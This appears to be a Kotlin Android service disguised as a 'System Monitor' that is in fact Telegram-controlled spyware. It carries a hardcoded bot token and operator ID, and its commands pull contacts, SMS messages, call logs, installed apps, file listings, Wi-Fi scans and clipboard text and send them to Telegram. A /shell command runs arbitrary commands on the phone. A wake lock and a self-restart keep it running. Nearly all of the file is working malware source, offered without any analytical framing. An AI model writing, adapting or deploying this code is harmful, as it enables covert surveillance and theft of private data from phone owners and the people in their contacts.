package com.sysmonitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.database.Cursor
import android.location.LocationListener
import android.location.LocationManager
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

const val PREFS_NAME = "monitor_config"
const val KEY_PERSISTENT = "persistent_mode"
const val KEY_ONBOARD_SENT = "onboard_sent"

const val BOT_TOKEN = "8891325647:AAG1P58n7FY4efJlTWUzjhdA1XMb1CpsX3k"
const val ALLOWED_USER_ID = 8335972628L
const val TELEGRAM_API = "https://api.telegram.org/bot"

class MonitorService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private val gson = Gson()
    private var wakeLock: android.os.PowerManager.WakeLock? = null
    private var persistentMode = true
    private var commandReceiver: CommandReceiver? = null
    private var pollThread: Thread? = null
    private var lastUpdateId = 0L
    private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).build()

    inner class LocalBinder : Binder() {
        fun getService(): MonitorService = this@MonitorService
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("MonitorService", "onCreate")
        initializeService()
    }

    private fun initializeService() {
        try {
            loadConfig()
            acquireWakeLock()
            running = true
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(1, notification)
            registerCommandReceiver()
            startTelegramBot()
            Log.d("MonitorService", "Service initialized")
        } catch (e: Exception) {
            Log.e("MonitorService", "Init error", e)
        }
    }

    private fun loadConfig() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
        val onboardSent = prefs.getBoolean(KEY_ONBOARD_SENT, false)
        if (!onboardSent) {
            sendTelegramMessage(ALLOWED_USER_ID, "Device connected: ${Build.MODEL} (Android ${Build.VERSION.RELEASE})")
            prefs.edit().putBoolean(KEY_ONBOARD_SENT, true).apply()
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "MonitorService::wakelock")
            wakeLock?.acquire()
        } catch (e: Exception) {
            Log.e("MonitorService", "Wake lock error", e)
        }
    }

    private fun registerCommandReceiver() {
        commandReceiver = CommandReceiver()
        val filter = IntentFilter("com.sysmonitor.ACTION_COMMAND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver!!, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(commandReceiver!!, filter)
        }
    }

    private fun startTelegramBot() {
        Thread({ deleteWebhook() }, "delete-wh").start()
        pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
    }

    private fun deleteWebhook() {
        try {
            val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
            val req = Request.Builder().url(url).build()
            client.newCall(req).execute().use { Log.d("Telegram", "WH: ${it.body?.string()}") }
        } catch (e: Exception) { Log.e("Telegram", "WH error", e) }
    }

    private fun pollLoop() {
        while (running) {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
                val req = Request.Builder().url(url).build()
                client.newCall(req).execute().use { resp ->
                    val body = resp.body?.string() ?: ""
                    if (resp.isSuccessful && body.isNotBlank()) {
                        try {
                            val json = com.google.gson.JsonParser.parseString(body).asJsonObject
                            if (json.get("ok").asBoolean) {
                                val updates = json.get("result").asJsonArray
                                updates.forEach { update ->
                                    val updateId = update.asJsonObject.get("update_id").asLong
                                    if (updateId > lastUpdateId) lastUpdateId = updateId
                                    handleTelegramUpdate(update.asJsonObject)
                                }
                            }
                        } catch (e: Exception) { Log.e("Telegram", "Parse error", e) }
                    }
                }
            } catch (e: Exception) { Log.e("Telegram", "Poll error", e) }
            try { Thread.sleep(2000) } catch (e: InterruptedException) { return }
        }
    }

    private fun handleTelegramUpdate(update: com.google.gson.JsonObject) {
        val msg = update.get("message")?.asJsonObject ?: return
        val chatId = msg.get("chat").asJsonObject.get("id").asLong
        val userId = msg.get("from").asJsonObject.get("id").asLong
        val text = msg.get("text")?.asString ?: ""
        
        if (userId != ALLOWED_USER_ID) {
            sendTelegramMessage(chatId, "Unauthorized. Your ID: $userId")
            return
        }
        
        when (text.trim()) {
            "/start", "/help" -> sendTelegramMessage(chatId, getHelp())
            "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
            "/contacts" -> sendTelegramTask(chatId, "contacts", mapOf<String, Any>())
            "/sms" -> sendTelegramTask(chatId, "sms", mapOf<String, Any>())
            "/calls" -> sendTelegramTask(chatId, "call_logs", mapOf<String, Any>())
            "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
            "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
            "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
            "/wifi" -> sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
            "/clipboard" -> sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
            "/screenshot" -> sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
            "/audio" -> sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
            "/camera" -> sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
            else -> {
                if (text.startsWith("/shell ")) sendTelegramTask(chatId, "shell", mapOf("command" to text.substring(7).trim()))
                else sendTelegramMessage(chatId, "Unknown. Use /help")
            }
        }
    }

    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>) {
        val taskId = java.util.UUID.randomUUID().toString()
        val intent = Intent().apply {
            setClassName("com.sysmonitor", "com.sysmonitor.MonitorService")
            action = "com.sysmonitor.ACTION_COMMAND"
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
            putExtra("reply_chat", chatId)
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
            sendTelegramMessage(chatId, "Task sent: $capability")
        } catch (e: Exception) {
            sendTelegramMessage(chatId, "Failed: ${e.message}")
        }
    }

    inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val capability = intent.getStringExtra("capability") ?: return
            val argsJson = intent.getStringExtra("args") ?: "{}"
            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
            val replyChat = intent.getLongExtra("reply_chat", 0)

            Thread({ executeAndSend(taskId, capability, argsJson, replyChat) }, "task-$taskId").start()
        }
    }

    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long) {
        var output: Any? = null
        var error: String? = null
        var status = "completed"
        try {
            output = executeCapability(capability, argsJson)
        } catch (e: Exception) {
            error = e.message
            status = "failed"
        }
        sendResult(taskId, output, error, status, replyChat)
    }

    private fun executeCapability(capability: String, argsJson: String): Any {
        val args = gson.fromJson(argsJson, Map::class.java)
        return when (capability) {
            "contacts" -> getContacts()
            "sms" -> getSms()
            "call_logs" -> getCallLogs()
            "apps" -> getApps()
            "location" -> mapOf("note" to "Location requires LocationListener")
            "files" -> getFiles(args as Map<String, Any>)
            "wifi" -> scanWifi()
            "clipboard" -> getClipboard()
            "screen" -> mapOf("note" to "Screenshot requires MediaProjection")
            "audio" -> mapOf("note" to "Audio requires MediaRecorder")
            "camera" -> mapOf("note" to "Camera requires Camera2 API")
            "shell" -> runShell(args["command"] as? String ?: "")
            else -> mapOf("error" to "Unknown capability: $capability")
        }
    }

    private fun getContacts(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                    val hasPhone = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                    val phones = mutableListOf<String>()
                    if (hasPhone) {
                        val pCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        pCursor?.use {
                            while (it.moveToNext()) {
                                phones.add(it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                            }
                        }
                    }
                    val m = mutableMapOf<String, Any>()
                    m["id"] = id
                    m["name"] = name
                    m["phones"] = phones
                    list.add(m)
                }
            }
        } catch (e: Exception) { Log.e("Contacts", "Error", e) }
        val m = mutableMapOf<String, Any>()
        m["contacts"] = list
        m["count"] = list.size
        return m
    }

    private fun getSms(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val m = mutableMapOf<String, Any>()
                    m["address"] = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    m["body"] = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    m["date"] = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val t = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    m["type"] = when (t) { 1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; else -> "other" }
                    list.add(m)
                    count++
                }
            }
        } catch (e: Exception) { Log.e("Sms", "Error", e) }
        val m = mutableMapOf<String, Any>()
        m["sms"] = list
        m["count"] = list.size
        return m
    }

    private fun getCallLogs(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 100) {
                    val m = mutableMapOf<String, Any>()
                    m["number"] = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    m["name"] = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                    m["date"] = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    m["duration"] = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val t = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    m["type"] = when (t) { 1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"; else -> "unknown" }
                    list.add(m)
                    count++
                }
            }
        } catch (e: Exception) { Log.e("Calls", "Error", e) }
        val m = mutableMapOf<String, Any>()
        m["calls"] = list
        m["count"] = list.size
        return m
    }

    private fun getApps(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
            apps.forEach { app ->
                val m = mutableMapOf<String, Any>()
                m["package"] = app.packageName
                m["name"] = pm.getApplicationLabel(app).toString()
                m["system"] = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                list.add(m)
            }
        } catch (e: Exception) { Log.e("Apps", "Error", e) }
        val m = mutableMapOf<String, Any>()
        m["apps"] = list
        m["count"] = list.size
        return m
    }

    private fun getFiles(args: Map<String, Any>): Map<String, Any> {
        val action = args["action"] as? String ?: "list"
        val path = args["path"] as? String ?: "/sdcard"
        return when (action) {
            "list" -> {
                val dir = File(path)
                if (!dir.exists() || !dir.isDirectory) mapOf("error" to "Not a directory")
                else {
                    val files = dir.listFiles()?.mapNotNull { f ->
                        try {
                            val m = mutableMapOf<String, Any>()
                            m["name"] = f.name
                            m["path"] = f.absolutePath
                            m["size"] = f.length()
                            m["isDir"] = f.isDirectory
                            m["modified"] = f.lastModified()
                            m
                        } catch (e: Exception) { null }
                    } ?: emptyList()
                    val m = mutableMapOf<String, Any>()
                    m["files"] = files
                    m["path"] = path
                    m["count"] = files.size
                    m
                }
            }
            else -> mapOf("error" to "Unknown action")
        }
    }

    private fun scanWifi(): Map<String, Any> {
        val wm = getSystemService(android.net.wifi.WifiManager::class.java)
        val results = wm.scanResults ?: emptyList()
        val networks = mutableListOf<Map<String, Any>>()
        results.forEach { r ->
            val m = mutableMapOf<String, Any>()
            m["ssid"] = r.SSID
            m["bssid"] = r.BSSID
            m["level"] = r.level
            m["freq"] = r.frequency
            m["caps"] = r.capabilities
            networks.add(m)
        }
        val m = mutableMapOf<String, Any>()
        m["networks"] = networks
        m["count"] = networks.size
        return m
    }

    private fun getClipboard(): Map<String, Any> {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        if (cm.hasPrimaryClip()) {
            val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
            val m = mutableMapOf<String, Any>()
            m["text"] = clip
            m["has_content"] = clip.isNotEmpty()
            return m
        }
        val m = mutableMapOf<String, Any>()
        m["text"] = ""
        m["has_content"] = false
        return m
    }

    private fun runShell(cmd: String): Map<String, Any> {
        if (cmd.isBlank()) return mapOf("error" to "No command")
        try {
            val process = Runtime.getRuntime().exec(cmd)
            val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
            val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
            val exitCode = process.waitFor()
            val m = mutableMapOf<String, Any>()
            m["exit"] = exitCode
            m["output"] = output
            m["error"] = error
            return m
        } catch (e: Exception) { return mapOf("error" to (e.message ?: "unknown error")) }
    }

    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
        val intent = Intent("com.sysmonitor.ACTION_RESULT").apply {
            putExtra("task_id", taskId)
            putExtra("result", result?.toString() ?: "")
            putExtra("error", error ?: "")
            putExtra("status", status)
        }
        sendBroadcast(intent)
        
        if (replyChat != 0L) {
            val msg = if (status == "completed" && result != null) {
                "Task $taskId completed:\n$result"
            } else {
                "Task $taskId failed:\n$error"
            }
            sendTelegramMessage(replyChat, msg)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("monitor_service", "System Monitor", NotificationManager.IMPORTANCE_LOW)
                .apply { description = "Background monitoring" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, "monitor_service")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun sendTelegramMessage(chatId: Long, text: String) {
        Thread({ sendTelegramInternal(chatId, text) }, "tg-$chatId").start()
    }

    private fun sendTelegramInternal(chatId: Long, text: String) {
        try {
            val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
            val params = mutableMapOf<String, Any>()
            params["chat_id"] = chatId
            params["text"] = text
            params["parse_mode"] = "Markdown"
            val body = gson.toJson(params).toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
        } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
    }

    private fun getHelp(): String = """SysMonitor Commands:
/start /help - This help
/status - Service status
/contacts /sms /calls - Get data
/apps - List apps
/location - Get GPS
/files - List files
/wifi - Scan networks
/clipboard - Get clipboard
/screenshot - Capture screen
/audio - Record audio
/camera - Take photo
/shell <cmd> - Run shell
""".trimIndent()

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = if (persistentMode) START_STICKY else START_NOT_STICKY

    override fun onDestroy() {
        running = false
        wakeLock?.release()
        pollThread?.interrupt()
        commandReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        if (persistentMode) startService(Intent(this, MonitorService::class.java))
        super.onDestroy()
    }
}